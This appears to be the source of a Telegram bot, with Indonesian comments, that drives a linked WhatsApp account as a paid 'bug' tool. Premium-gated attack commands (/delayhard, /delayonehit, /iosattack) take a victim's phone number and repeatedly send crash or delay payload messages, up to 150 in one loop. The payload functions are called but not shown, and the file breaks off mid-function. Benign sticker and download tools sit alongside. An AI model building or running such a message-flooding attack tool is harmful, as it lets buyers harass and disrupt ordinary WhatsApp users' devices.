const { Telegraf, Markup, session } = require("telegraf"); 
const fs = require("fs");
const path = require("path");
const moment = require("moment-timezone");
const {
  makeWASocket,
  makeInMemoryStore,
  fetchLatestBaileysVersion,
  useMultiFileAuthState,
  DisconnectReason,
  generateWAMessageFromContent,
  generateWAMessage,
} = require("@bellachu/baileys");
const pino = require("pino");
const chalk = require("chalk");
const axios = require("axios");
const readline = require('readline');
const { BOT_TOKEN, OWNER_IDS } = require("./config.js");
const crypto = require("crypto");
const sessionPath = './session';
let bots = [];
const bot = new Telegraf(BOT_TOKEN);
const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));
// === Path File ===
const premiumFile = "./Faxzz/premiums.json";
const adminFile = "./Faxzz/admins.json";

// === Fungsi Load & Save JSON ===
const loadJSON = (filePath) => {
  try {
    const data = fs.readFileSync(filePath);
    return JSON.parse(data);
  } catch (err) {
    console.error(chalk.red(`Gagal memuat file ${filePath}:`), err);
    return [];
  }
};

const saveJSON = (filePath, data) => {
  fs.writeFileSync(filePath, JSON.stringify(data, null, 2));
};

// === Load Semua Data Saat Startup ===
let adminUsers = loadJSON(adminFile);
let premiumUsers = loadJSON(premiumFile);

// === Middleware Role ===
const checkOwner = (ctx, next) => {
  const userId = ctx.from.id.toString(); 
  if (!OWNER_IDS.includes(userId)) {
    return ctx.reply("❗Mohon Maaf Fitur Ini Khusus Owner");
  }

  return next();
};

const checkAdmin = (ctx, next) => {
  if (!adminUsers.includes(ctx.from.id.toString())) {
    return ctx.reply("❗ Mohon Maaf Fitur Ini Khusus Admin.");
  }
  next();
};

const checkPremium = (ctx, next) => {
  if (!isPremium(ctx.from.id.toString())) {
    return ctx.reply("❗ Fitur ini khusus Premium.");
  }
  next();
};

// === Fungsi Admin / Premium ===
const addadmin = (userId) => {
  if (!adminUsers.includes(userId)) {
    adminUsers.push(userId);
    saveJSON(adminFile, adminUsers);
  }
};

const removeAdmin = (userId) => {
  adminUsers = adminUsers.filter((id) => id !== userId);
  saveJSON(adminFile, adminUsers);
};

// ==================== PREMIUM DENGAN DURASI ====================
const premiumDataFile = "./Faxzz/premium_data.json";
let premiumData = {};

function loadPremiumData() {
  try {
    if (fs.existsSync(premiumDataFile)) {
      premiumData = JSON.parse(fs.readFileSync(premiumDataFile));
    } else {
      premiumData = {};
    }
  } catch (e) { premiumData = {}; }
}
function savePremiumData() {
  fs.writeFileSync(premiumDataFile, JSON.stringify(premiumData, null, 2));
}
loadPremiumData();

function isPremium(userId) {
  const data = premiumData[userId.toString()];
  if (!data) return false;
  if (data.expiry === 0) return true;
  if (data.expiry > Math.floor(Date.now() / 1000)) return true;
  delete premiumData[userId.toString()];
  savePremiumData();
  return false;
}

function getPremiumRemaining(userId) {
  const data = premiumData[userId.toString()];
  if (!data) return "Tidak premium";
  if (data.expiry === 0) return "Permanen";
  const remaining = data.expiry - Math.floor(Date.now() / 1000);
  if (remaining <= 0) return "Habis";
  const days = Math.floor(remaining / 86400);
  const hours = Math.floor((remaining % 86400) / 3600);
  return `${days} hari ${hours} jam`;
}

function addPremium(userId, days) {
  const expiry = days === 0 ? 0 : Math.floor(Date.now() / 1000) + days * 86400;
  premiumData[userId.toString()] = { expiry, type: days === 0 ? "permanent" : `${days}days` };
  savePremiumData();
}

function removePremium(userId) {
  delete premiumData[userId.toString()];
  savePremiumData();
}
bot.use(session());

let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = "";
const usePairingCode = true;
///////// RANDOM IMAGE JIR \\\\\\\
const randomImages = [
"https://files.catbox.moe/pm6sti.jpg",
"https://files.catbox.moe/pm6sti.jpg",
];

const getRandomImage = () =>
  randomImages[Math.floor(Math.random() * randomImages.length)];

// Fungsi untuk mendapatkan waktu uptime
const getUptime = () => {
  const uptimeSeconds = process.uptime();
  const hours = Math.floor(uptimeSeconds / 3600);
  const minutes = Math.floor((uptimeSeconds % 3600) / 60);
  const seconds = Math.floor(uptimeSeconds % 60);

  return `${hours}h ${minutes}m ${seconds}s`;
};

const question = (query) =>
  new Promise((resolve) => {
    const rl = require("readline").createInterface({
      input: process.stdin,
      output: process.stdout,
    });
    rl.question(query, (answer) => {
      rl.close();
      resolve(answer);
    });
  });

function startBot() {
  console.clear();
  console.log(chalk.bold.yellow(`⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
▄
▄▀▄ █▄░█ ▄▀▀░ █▀░█░█
█▀█ █░▀█ █░▀▌ █▀░▄▀▄
▀░▀ ▀░░▀ ▀▀▀░ ▀▀░▀░▀
█▀ ▄▀▄ █░█ ▀▀▀█ ▀▀▀█
█▀ █▀█ ▄▀▄ ░▄▀░ ░▄▀░
▀░ ▀░▀ ▀░▀ ▀▀▀▀ ▀▀▀▀
      `));
  console.log(
    chalk.bold.green(`
[!] System: Sc ampas 🥵🥵
───────────────────────────
© BOOSTER-BESSTER  ||  B A S E T A I K 
`));
}

startBot();

// WhatsApp Connection
const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) });

const startSesi = async () => {
  const { state, saveCreds } = await useMultiFileAuthState('./session');
  const { version } = await fetchLatestBaileysVersion();

  const connectionOptions = {
    version,
    keepAliveIntervalMs: 30000,
    printQRInTerminal: false,
    logger: pino({ level: "silent" }),
    auth: state,
    browser: ['Mac OS', 'Safari', '10.15.7'],
    getMessage: async (key) => ({
      conversation: 'P', // Placeholder default
    }),
  };

  sock = makeWASocket(connectionOptions);
  sock.ev.on('creds.update', saveCreds);
  store.bind(sock.ev);

  sock.ev.on('connection.update', (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === 'open') {
      sock.newsletterFollow("120363404343696075@newsletter");
      isWhatsAppConnected = true;
      console.log(chalk.red.bold(`
╭─────────────────────────────╮
│ ${chalk.white('Berhasil Tersambung')}
╰─────────────────────────────╯`));
    }

    if (connection === 'close') {
      const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
      console.log(chalk.red.bold(`
╭─────────────────────────────╮
│ ${chalk.white('Whatsapp Terputus')}
╰─────────────────────────────╯`));

      if (shouldReconnect) {
        console.log(chalk.red.bold(`
╭─────────────────────────────╮
│ ${chalk.white('Menyambung kembali...')}
╰─────────────────────────────╯`));
        startSesi();
      }

      isWhatsAppConnected = false;
    }
  });
};

const checkWhatsAppConnection = (ctx, next) => {
if (!isWhatsAppConnected) {
ctx.reply(`
❌ WhatsApp Belum terhubung
`);
return;
}
next();
};

////=========MENU UTAMA========\\\\
bot.start(async (ctx) => {
  const chatId = ctx.chat.id;
  const senderId = ctx.from.id;

  const premiumStatus = isPremium(senderId.toString()) ? "✅ Aktif" : "❌ Tidak";
  const username = ctx.from.username ? `@${ctx.from.username}` : "Tidak ada username";

  const waktuRunPanel = getUptime();

  const mainMenuMessage = `<blockquote><b>Hallo Selamat Datang Di Ange Project</b></blockquote>
<b>Ange Project</b>
<b>「ɪɴғᴏʀᴍᴀᴛɪᴏɴ」</b>
<b>⛧ Owner</b> : @RZOKISAP  
<b>⛧ Version</b> : 2.0
<b>⛧ Premium</b> : ${premiumStatus}
<b>⛧ Runtime</b> : ${waktuRunPanel}
<b>⛧ UserId</b> : ${senderId}
<blockquote><b>╔═⊱「 𝐏𝐥𝐞𝐚𝐬𝐞 𝐒𝐞𝐥𝐞𝐜𝐭 𝐓𝐡𝐞 𝐁𝐮𝐭𝐭𝐨𝐧 」──◈
║ 𝘗𝘳𝘦𝘴𝘴 𝘉𝘶𝘵𝘵𝘰𝘯 𝘉𝘦𝘭𝘰𝘸 𝘏𝘦𝘳𝘦
┗━━━━━━━━━━━━━━◈</b></blockquote>`;

  const mainKeyboard = [
    [
      { text: "≡ Tools ! menu⌟", callback_data: "tools", style: "primary", icon_custom_emoji_id: "5350613306090482956" },
      { text: "≡ Attack ! menu⌟", callback_data: "bug_menu", style: "danger", icon_custom_emoji_id: "5350490470025816976" }
    ],    
    [
     { text: "≡ Thanks To ! menu⌟", callback_data: "tq", style: "success", icon_custom_emoji_id: "5104960787579929462" }
    ],
    [ 
     { text: "≡ Devolopers ⌟", url: "https://t.me/RZOKISAP", style: "primary", icon_custom_emoji_id: "5352670019899652428" },
     { text: "≡ Owner ‡ menu ⌟", callback_data: "owner_menu", style: "success", icon_custom_emoji_id: "5352874632141628924" }
    ]
  ];

  await ctx.replyWithPhoto(getRandomImage(), {
    caption: mainMenuMessage,
    parse_mode: "HTML",
    reply_markup: { inline_keyboard: mainKeyboard },
  });
});

// Handler untuk owner_menu
bot.action("owner_menu", async (ctx) => {
  const firstName = ctx.from.first_name || "User"; 
  const premiumStatus = isPremium(ctx.from.id.toString()) ? "✅ Aktif" : "❌ Tidak";
  const waktuRunPanel = getUptime();    
      const mainMenuMessage = `
<blockquote><b>Hallo ${firstName} Selamat Datang Di Ange Project</b></blockquote>
<b>Ange Project</b>
<b>「ɪɴғᴏʀᴍᴀᴛɪᴏɴ」</b>
<b>⛧ Owner</b> : @RZOKISAP
<b>⛧ Version</b> : 2.0
<b>⛧ Premium</b> : ${premiumStatus}
<b>⛧ Runtime</b> : ${waktuRunPanel}

<blockquote>AKSES MENU</blockquote>
<b>▢ /cekprem - cek prem. buyer</b>
<b>▢ /delgc - Delete Premium Group</b>
<b>▢ /addprem - Add Premium Users</b>
<b>▢ /delprem - Delete Premium Users</b>
<b>▢ /addadmin - Add admin users</b>
<b>▢ /deladmin - delete admin</b>
<b>▢ /setcd - Set Bot Cooldown</b>
<b>▢ /Status - Status apa tau</b>
<b>▢ /selsension - Reset Existing Session</b>
<b>▢ /addsender - Add Sender Number</b>
`;

  const media = {
    type: "photo",
    media: getRandomImage(), 
    caption: mainMenuMessage,
    parse_mode: "HTML"
  };

  const keyboard = {
    inline_keyboard: [
      [{ text: "⏎ Back", callback_data: "back", style: "success" }]
    ],
  };

  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard,
    });
  }
});
// Handler bug_menu
bot.action("bug_menu", async (ctx) => {
  const firstName = ctx.from.first_name || "User"; 
  const premiumStatus = isPremium(ctx.from.id.toString()) ? "✅ Aktif" : "❌ Tidak";
  const waktuRunPanel = getUptime();    
      const mainMenuMessage = `
<blockquote><b>Hallo ${firstName} Selamat Datang Di Ange Project</b></blockquote>
<b>Ange Project</b>
<b>「ɪɴғᴏʀᴍᴀᴛɪᴏɴ」</b>
<b>⛧ Owner</b> : @RZOKISAP
<b>⛧ Version</b> : 2.0
<b>⛧ Premium</b> : ${premiumStatus}
<b>⛧ Runtime</b> : ${waktuRunPanel}

<blockquote>Delay menu</blockquote>
<blockquote><b>ⵢ Delay Type ⵢ</b></blockquote>
• <b>/Crash</b> – Mention Status Types
• <b>/snowhard</b> – Invisible Types
• <b>/visiblow</b> – Visible Types
`;

  const media = {
    type: "photo",
    media: getRandomImage(), 
    caption: mainMenuMessage,
    parse_mode: "HTML"
  };

  const keyboard = {
    inline_keyboard: [
      [{ text: "⏎ Back", callback_data: "back", style: "primary" }]
    ],
  };

  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard,
    });
  }
});
// Handler Tq to
bot.action("tq", async (ctx) => {
  const firstName = ctx.from.first_name || "User"; 
  const premiumStatus = isPremium(ctx.from.id.toString()) ? "✅ Aktif" : "❌ Tidak";
  const waktuRunPanel = getUptime();    
      const mainMenuMessage = `
<blockquote><b>Hallo ${firstName} Selamat Datang Di Ange Project</b></blockquote>
<b>Ange Project</b>
<b>「ɪɴғᴏʀᴍᴀᴛɪᴏɴ」</b>
<b>⛧ Owner</b> : @RZOKISAP
<b>⛧ Version</b> : 2.0
<b>⛧ Premium</b> : ${premiumStatus}
<b>⛧ Runtime</b> : ${waktuRunPanel}
 <blockquote>ᴛʜᴀɴᴋꜱ ᴛᴏ</blockquote>
  ▢ - RZOKISAP ( Dev )
  ▢ - My Buyer ( My Atm )
  ▢ - My wolt ( Suport )
`;

  const media = {
    type: "photo",
    media: getRandomImage(), 
    caption: mainMenuMessage,
    parse_mode: "HTML"
  };

  const keyboard = {
    inline_keyboard: [
      [{ text: "⏎ Back", callback_data: "back", style: "primary" }]
    ],
  };

  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard,
    });
  }
});
// Handler tools
bot.action("tools", async (ctx) => {
  const firstName = ctx.from.first_name || "User"; 
  const premiumStatus = isPremium(ctx.from.id.toString()) ? "✅ Aktif" : "❌ Tidak";
  const waktuRunPanel = getUptime();    
  const mainMenuMessage = `
<blockquote><b>Hallo ${firstName} Selamat Datang Di Ange Project</b></blockquote>
<b>Ange Project</b>
<b>「ɪɴғᴏʀᴍᴀᴛɪᴏɴ」</b>
<b>⛧ Owner</b> : @RZOKISAP
<b>⛧ Version</b> : 2.0
<b>⛧ Premium</b> : ${premiumStatus}
<b>⛧ Runtime</b> : ${waktuRunPanel}

<blockquote>TOOLS MENU</blockquote>
<b>⫹⫺ /brat = sticker brat</b>
<b>⫹⫺ /yt = Donwload yt</b>
<b>⫹⫺ /iqc = Templet iphone</b>
<b>⫹⫺ /fixcode = fix code/file</b>
──────────────────────
`;

  const media = {
    type: "photo",
    media: getRandomImage(),
    caption: mainMenuMessage,
    parse_mode: "HTML"
  };

  const keyboard = {
    inline_keyboard: [
      [{ text: "⏎ Back", callback_data: "back", style: "danger" }]
    ],
  };

  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard 
    });
  }
});
// Handler untuk back main menu
bot.action("back", async (ctx) => {
  const chatId = ctx.chat.id;
  const senderId = ctx.from.id;

  const premiumStatus = isPremium(senderId.toString()) ? "✅ Aktif" : "❌ Tidak";
  const username = ctx.from.username ? `@${ctx.from.username}` : "Tidak ada username";
  const firstName = ctx.from.first_name || "User"; // Tambahan untuk menggantikan Name

  const waktuRunPanel = getUptime();

  const mainMenuMessage = `<blockquote><b>Hallo Selamat Datang Di Ange Project</b></blockquote>
<b>Ange Project</b>
<b>「ɪɴғᴏʀᴍᴀᴛɪᴏɴ」</b>
<b>⛧ Owner</b> : @RZOKISAP
<b>⛧ Version</b> : 2.0
<b>⛧ Premium</b> : ${premiumStatus}
<b>⛧ Runtime</b> : ${waktuRunPanel}
<b>⛧ UserId</b> : ${senderId}
<blockquote><b>╔═⊱「 𝐏𝐥𝐞𝐚𝐬𝐞 𝐒𝐞𝐥𝐞𝐜𝐭 𝐓𝐡𝐞 𝐁𝐮𝐭𝐭𝐨𝐧 」──◈
║ 𝘗𝘳𝘦𝘴𝘴 𝘉𝘶𝘵𝘵𝘰𝘯 𝘉𝘦𝘭𝘰𝘸 𝘏𝘦𝘳𝘦
┗━━━━━━━━━━━━━━◈</b></blockquote>`;

  const mainKeyboard = [
    [
      { text: "≡ Tools ! menu⌟", callback_data: "tools", style: "primary", icon_custom_emoji_id: "5350613306090482956" },
      { text: "≡ Attack ! menu⌟", callback_data: "bug_menu", style: "danger", icon_custom_emoji_id: "5350490470025816976" }
    ],    
    [
     { text: "≡ Thanks To ! menu⌟", callback_data: "tq", style: "success", icon_custom_emoji_id: "5104960787579929462" }
    ],
    [ 
     { text: "≡ Devolopers ⌟", url: "https://t.me/FaxzzModzz", style: "primary", icon_custom_emoji_id: "5352670019899652428" },
     { text: "≡ Owner ‡ menu ⌟", callback_data: "owner_menu", style: "success", icon_custom_emoji_id: "5352874632141628924" }
    ]
  ];

  // Definisi media untuk edit/reply
  let media = {
    type: "photo",
    media: getRandomImage() + "?t=" + Date.now(),
    parse_mode: "HTML",
    caption: mainMenuMessage
  };

  try {
    await ctx.editMessageMedia(media, { reply_markup: { inline_keyboard: mainKeyboard } });
  } catch (err) {
    console.log("Edit media gagal, fallback ke sendPhoto:", err.message);
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: { inline_keyboard: mainKeyboard },
    });
  }
});

//////// -- CASE BUG 1 --- \\\\\\\\\\\
// tambahin aja case bugnya kalo kurang
// Command delaybeta (versi Telegraf)
bot.command("delayhard", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /delayhard 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://c.termai.cc/i125/ACFDN.jpg", {
    caption: `
<blockquote>交 BOOSTER BESSTER ᝄ</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /delayhard 
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    },
  });

  (async () => {
    for (let i = 0; i < 150; i++) {
      console.log(chalk.red(`Send Bug CurseDelay ${i + 1}/150 To ${q}`));
      await DelayInvisNew(sock, target);
      await sleep(4500);
    }
  })();
});
bot.command("delayonehit", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /delayonehit 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://c.termai.cc/i125/ACFDN.jpg", {
    caption: `
<blockquote>交 BOOSTER BESSTER ᝄ</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /delayonehit 
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    },
  });

  (async () => {
    for (let i = 0; i < 10; i++) {
      console.log(chalk.red(`Send Bug Delay One Hit ${i + 1}/10 To ${q}`));
      await DelayInvisNew(sock, target);
      await sleep(7000);
      await DelayInvisNew(sock, target);
      await sleep(8000);
    }
  })();
});
bot.command("iosattack", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /iosattack 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://c.termai.cc/i125/ACFDN.jpg", {
    caption: `
<blockquote>交 BOOSTER BESSTER ᝄ</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes 
☇ Type: /iosattack 
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    },
  });

  (async () => {
    for (let i = 0; i < 10; i++) {
      console.log(chalk.red(`Send Bug Delay iOs Free Spam ${i + 1}/10 To ${q}`));
      await IPhoneDelay(target, ptcp = true);
      await sleep(8000);
    }
  })();
});
// Kumpulan Tools Hama
// ============================================
// COMMAND /iqc - IPHONE QUOTE GENERATOR
// ============================================
bot.command("iqc", async (ctx) => {
  const text = ctx.message.text.split(" ").slice(1).join(" ");

  if (!text) {
    return ctx.reply(
      "❌ *Format salah!*\n\nContoh: `/iqc 18:00|40|Indosat|Halo ges`",
      { parse_mode: "Markdown" }
    );
  }

  let [time, battery, carrier, ...msgParts] = text.split("|");
  if (!time || !battery || !carrier || msgParts.length === 0) {
    return ctx.reply(
      "❌ *Format salah!*\nHarus: `jam|baterai|operator|pesan`\nContoh: `/iqc 18:00|40|Indosat|Halo ges`",
      { parse_mode: "Markdown" }
    );
  }

  await ctx.reply("⏳ *Membuat quote iPhone...*", { parse_mode: "Markdown" });

  const messageText = encodeURIComponent(msgParts.join("|").trim());
  const url = `https://brat.siputzx.my.id/iphone-quoted?time=${encodeURIComponent(time)}&batteryPercentage=${battery}&carrierName=${encodeURIComponent(carrier)}&messageText=${messageText}&emojiStyle=apple`;

  try {
    const response = await axios.get(url, { responseType: "arraybuffer" });
    const buffer = Buffer.from(response.data);

    await ctx.replyWithPhoto({ source: buffer }, {
      caption: `✅ *Quote iPhone berhasil dibuat!*`,
      parse_mode: "Markdown"
    });
  } catch (error) {
    console.error("IQC error:", error);
    ctx.reply("❌ *Gagal membuat quote iPhone.* Coba lagi nanti.", { parse_mode: "Markdown" });
  }
});
// TOOLS BRAT
// ============================================
// COMMAND /brat - BIKIN STIKER BRAT 🗿
// ============================================
bot.command('brat', async (ctx) => {
  const userId = ctx.from.id.toString();
  const chatType = ctx.chat.type;
  const args = ctx.message.text.split(' ').slice(1);
  const argsRaw = args.join(' ');
  
  if (!argsRaw) return ctx.reply('<blockquote>❌ <b>Syntax Error!</b></blockquote>\n\n<blockquote>Example : /brat kontol wowo --gif --delay=500\n\n© FyzzOffcial</blockquote>', { parse_mode: 'HTML' });
  
  try {
    const textParts = [];
    let isAnimated = false;
    let delay = 500;
    
    for (let arg of args) {
      if (arg === '--gif') isAnimated = true;
      else if (arg.startsWith('--delay=')) {
        const val = parseInt(arg.split('=')[1]);
        if (!isNaN(val)) delay = val;
      } else textParts.push(arg);
    }
    
    const text = textParts.join(' ');
    if (!text) return ctx.reply('<blockquote>❌ <b>Teks tidak boleh kosong!</b></blockquote>', { parse_mode: 'HTML' });
    
    if (isAnimated && (delay < 100 || delay > 1500)) return ctx.reply('<blockquote>❌ <b>Delay harus antara 100–1500 ms.</b></blockquote>', { parse_mode: 'HTML' });
    
    await ctx.reply('<blockquote>🌿 <b>Generating stiker brat...</b></blockquote>', { parse_mode: 'HTML' });
    
    const apiUrl = `https://api.siputzx.my.id/api/m/brat?text=${encodeURIComponent(text)}&isAnimated=${isAnimated}&delay=${delay}`;
    const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
    const buffer = Buffer.from(response.data);
    
    await ctx.replyWithSticker({ source: buffer });
    console.log(chalk.green(`✅ Brat sticker created for ${userId}`));
  } catch (error) {
    console.error(chalk.red(`❌ Brat error: ${error.message}`));
    await ctx.reply('<blockquote>❌ <b>Gagal membuat stiker brat. Coba lagi nanti ya!</b></blockquote>', { parse_mode: 'HTML' });
  }
});
// TOOLS TIKTOK DOWNLOAD
bot.command("tiktokdl", checkPremium, async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1).join(" ").trim();
  if (!args) return ctx.reply("🪧 Format: /tiktokdl https://vt.tiktok.com/ZSUeF1CqC/");

  let url = args;
  if (ctx.message.entities) {
    for (const e of ctx.message.entities) {
      if (e.type === "url") {
        url = ctx.message.text.substr(e.offset, e.length);
        break;
      }
    }
  }

  const wait = await ctx.reply("⏳ ☇ Sedang memproses video");

  try {
    const { data } = await axios.get("https://tikwm.com/api/", {
      params: { url },
      headers: {
        "user-agent":
          "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36 Chrome/123 Safari/537.36",
        "accept": "application/json,text/plain,*/*",
        "referer": "https://tikwm.com/"
      },
      timeout: 20000
    });

    if (!data || data.code !== 0 || !data.data)
      return ctx.reply("❌ ☇ Gagal ambil data video pastikan link valid");

    const d = data.data;

    if (Array.isArray(d.images) && d.images.length) {
      const imgs = d.images.slice(0, 10);
      const media = await Promise.all(
        imgs.map(async (img) => {
          const res = await axios.get(img, { responseType: "arraybuffer" });
          return {
            type: "photo",
            media: { source: Buffer.from(res.data) }
          };
        })
      );
      await ctx.replyWithMediaGroup(media);
      return;
    }

    const videoUrl = d.play || d.hdplay || d.wmplay;
    if (!videoUrl) return ctx.reply("❌ ☇ Tidak ada link video yang bisa diunduh");

    const video = await axios.get(videoUrl, {
      responseType: "arraybuffer",
      headers: {
        "user-agent":
          "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36 Chrome/123 Safari/537.36"
      },
      timeout: 30000
    });

    await ctx.replyWithVideo(
      { source: Buffer.from(video.data), filename: `${d.id || Date.now()}.mp4` },
      { supports_streaming: true }
    );
  } catch (e) {
    const err =
      e?.response?.status
        ? `❌ ☇ Error ${e.response.status} saat mengunduh video`
        : "❌ ☇ Gagal mengunduh, koneksi lambat atau link salah";
    await ctx.reply(err);
  } finally {
    try {
      await ctx.deleteMessage(wait.message_id);
    } catch {}
  }
});
// Perintah untuk menambahkan pengguna premium (hanya owner)
bot.command("addadmin", checkOwner, (ctx) => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return ctx.reply(
      "❌ Format Salah!. Example: /addadmin 12345678"
    );
  }

  const userId = args[1];

  if (adminUsers.includes(userId)) {
    return ctx.reply(`✅ Pengguna ${userId} sudah memiliki status admin.`);
  }

  adminUsers.push(userId);
  saveJSON(adminFile, adminUsers);

  return ctx.reply(`✅ Pengguna ${userId} sekarang memiliki akses admin!`);
});
bot.command("addprem", checkOwner, checkAdmin, async (ctx) => {
  const args = ctx.message.text.trim().split(" ");
  if (args.length < 2) {
    return ctx.reply("❌ Contoh: /addprem 12345678");
  }
  const userId = args[1].toString();

  // Cek apakah sudah premium
  if (isPremium(userId)) {
    const remaining = getPremiumRemaining(userId);
    return ctx.reply(`✅ User ${userId} sudah premium (${remaining}).`);
  }

  // Simpan userId sementara
  ctx.session = ctx.session || {};
  ctx.session.pendingPremUser = userId;

  const durasiKeyboard = {
    inline_keyboard: [
      [
        { text: "7 Hari", callback_data: "prem_7d" },
        { text: "30 Hari", callback_data: "prem_30d" },
        { text: "Permanen", callback_data: "prem_permanent" }
      ],
      [
        { text: "❌ Batal", callback_data: "prem_cancel" }
      ]
    ]
  };

  await ctx.reply(
    `⏱️ Pilih durasi premium untuk user \`${userId}\`:`,
    { parse_mode: "Markdown", reply_markup: durasiKeyboard }
  );
});

// Handler pilihan durasi
bot.action(/prem_(\d+d|permanent)/, async (ctx) => {
  const userId = ctx.session?.pendingPremUser;
  if (!userId) {
    await ctx.answerCbQuery("❌ Sesi habis, ulangi /addprem");
    return ctx.editMessageText("❌ Sesi habis, ketik /addprem lagi.");
  }

  const pilihan = ctx.match[1];
  let days = 0;
  if (pilihan === "7d") days = 7;
  else if (pilihan === "30d") days = 30;
  else if (pilihan === "permanent") days = 0;
  else return ctx.answerCbQuery("❌ Pilihan tidak valid");

  addPremium(userId, days);
  const durasiText = days === 0 ? "Permanen" : `${days} hari`;
  await ctx.answerCbQuery(`✅ Premium ${durasiText} ditambahkan`);
  await ctx.editMessageText(`✅ User \`${userId}\` sekarang premium (${durasiText}).`, { parse_mode: "Markdown" });

  // Kirim notifikasi ke user
  try {
    await ctx.telegram.sendMessage(userId, `🎉 Selamat! Anda mendapatkan akses premium ${durasiText}.`);
  } catch (e) {}

  delete ctx.session.pendingPremUser;
});

// Handler batal
bot.action("prem_cancel", async (ctx) => {
  await ctx.answerCbQuery("❌ Dibatalkan");
  await ctx.editMessageText("❌ Penambahan premium dibatalkan.");
  delete ctx.session?.pendingPremUser;
});
///=== comand del admin ===\\\
bot.command("deladmin", checkOwner, (ctx) => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return ctx.reply(
      "❌ Format Salah!. Example : /deladmin 12345678"
    );
  }

  const userId = args[1];

  if (!adminUsers.includes(userId)) {
    return ctx.reply(`❌ Pengguna ${userId} tidak ada dalam daftar Admin.`);
  }

  adminUsers = adminUsers.filter((id) => id !== userId);
  saveJSON(adminFile, adminUsers);

  return ctx.reply(`🚫 Pengguna ${userId} telah dihapus dari daftar Admin.`);
});
// Hapus baris yang pakai premiumUsers, ganti dengan:
bot.command("delprem", checkOwner, checkAdmin, async (ctx) => {
  const args = ctx.message.text.trim().split(" ");
  if (args.length < 2) return ctx.reply("❌ Contoh: /delprem 12345678");
  const userId = args[1].toString();
  if (!isPremium(userId)) return ctx.reply(`❌ User ${userId} tidak premium.`);
  delete premiumData[userId];
  savePremiumData();
  ctx.reply(`🚫 User ${userId} dihapus dari premium.`);
});

// Perintah untuk mengecek status premium
bot.command("cekprem", async (ctx) => {
  const userId = ctx.from.id.toString();
  const status = isPremium(userId) ? "✅ Premium" : "❌ Tidak premium";
  const sisa = getPremiumRemaining(userId);
  ctx.reply(`Status Anda: ${status}\n${sisa !== "Tidak premium" ? `Sisa: ${sisa}` : ""}`);
});

// Command untuk pairing WhatsApp
bot.command("addsender", checkOwner, async (ctx) => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return await ctx.reply("❌ Format Salah!. Example : /addsender <nomor_wa>");
  }

  let phoneNumber = args[1];
  phoneNumber = phoneNumber.replace(/[^0-9]/g, "");

  if (sock && sock.user) {
    return await ctx.reply("Whatsapp Sudah Terhubung");
  }

  try {
    const code = await sock.requestPairingCode(phoneNumber, "FAXZFAXZ");
    const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;

    await ctx.replyWithPhoto(getRandomImage(), {
      caption: `
<blockquote>
┏━━━━━━━━━━━━━━━━━━━━
┃☇ 𝗡𝗼𝗺𝗼𝗿 : ${phoneNumber}
┃☇ 𝗖𝗼𝗱𝗲 : <code>${formattedCode}</code>
┗━━━━━━━━━━━━━━━━━━━━
</blockquote>
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "𝗛𝗮𝗽𝘂𝘀", callback_data: "Close" }]],
      },
    });
  } catch (error) {
